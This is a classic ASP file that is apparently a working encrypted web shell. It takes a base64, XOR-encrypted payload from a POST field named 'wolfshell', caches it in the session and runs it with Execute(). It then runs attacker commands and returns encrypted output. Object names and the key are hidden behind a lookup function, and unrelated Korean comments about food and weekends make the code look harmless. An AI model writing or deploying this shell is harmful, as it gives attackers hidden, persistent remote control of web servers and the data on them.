<%
Dim data_map_11, secret_22, income_33, core_44, output_55
' // 오늘 저녁에 뭐 먹을까요?
Set data_map_11 = Server.CreateObject(string_resolver(1))

' // 이 코드는 정말 복잡하네요.
Function base64_to_bin(in_str)
    Dim x_obj, n_obj
    Set x_obj = CreateObject(string_resolver(2))
    Set n_obj = x_obj.CreateElement("b")
    n_obj.dataType = "bin.base64"
    n_obj.text = in_str
    base64_to_bin = n_obj.nodeTypedValue
    Set n_obj = Nothing
    Set x_obj = Nothing
End Function

' // 배고파요, 치킨 먹고 싶다.
Function transform_bytes(raw_content, as_binary)
    dim data_size, iterator, tmp_result, secret_size
    secret_size = len(secret_22)
    Set stream_obj = CreateObject(string_resolver(3))
    stream_obj.CharSet = "iso-8859-1"
    stream_obj.Type = 2
    stream_obj.Open
    ' // 그냥 평범한 주석입니다.
    if IsArray(raw_content) then
        data_size=UBound(raw_content)+1
        For iterator=1 To data_size
            stream_obj.WriteText chrw(ascb(midb(raw_content,iterator,1)) Xor Asc(Mid(secret_22,(iterator mod secret_size)+1,1)))
        Next
    end if
    stream_obj.Position = 0
    if as_binary then
        stream_obj.Type = 1
        transform_bytes=stream_obj.Read()
    else
        transform_bytes=stream_obj.ReadText()
    end if

End Function
    ' // 퇴근하고 싶다...
    secret_22 = string_resolver(4)
    income_33=request.Form(string_resolver(5))
    if not IsEmpty(income_33) then
        Dim logic_switch
        logic_switch = 0
        if IsEmpty(Session(string_resolver(6))) then
            logic_switch = 1
        end if
        
        If logic_switch = 1 then
            income_33=transform_bytes(base64_to_bin(income_33),false)
            Session(string_resolver(6))=income_33
            response.End
        Else
            income_33=transform_bytes(base64_to_bin(income_33),true)
            data_map_11.Add string_resolver(6),Session(string_resolver(6))
            ' // 주말에 뭐 할 계획이에요?
            Execute(data_map_11(string_resolver(6)))
            output_55=run(income_33)
            response.Write(string_resolver(7))
            if not IsEmpty(output_55) then
                response.Write Base64Encode(transform_bytes(output_55,true))
            end if
            response.Write(string_resolver(8))
        end if
    end if

Function string_resolver(item_code)
    Dim parts(8)
    parts(1) = "Scripting.Dictionary"
    parts(2) = "Msxml2.DOMDocument.3.0"
    parts(3) = "ADODB.Stream"
    parts(4) = "3c6e0b8a9c15224a"
    parts(5) = "wolfshell"
    parts(6) = "payload"
    parts(7) = "a71ab1"
    parts(8) = "4b8259"
    string_resolver = parts(item_code)
End Function
%>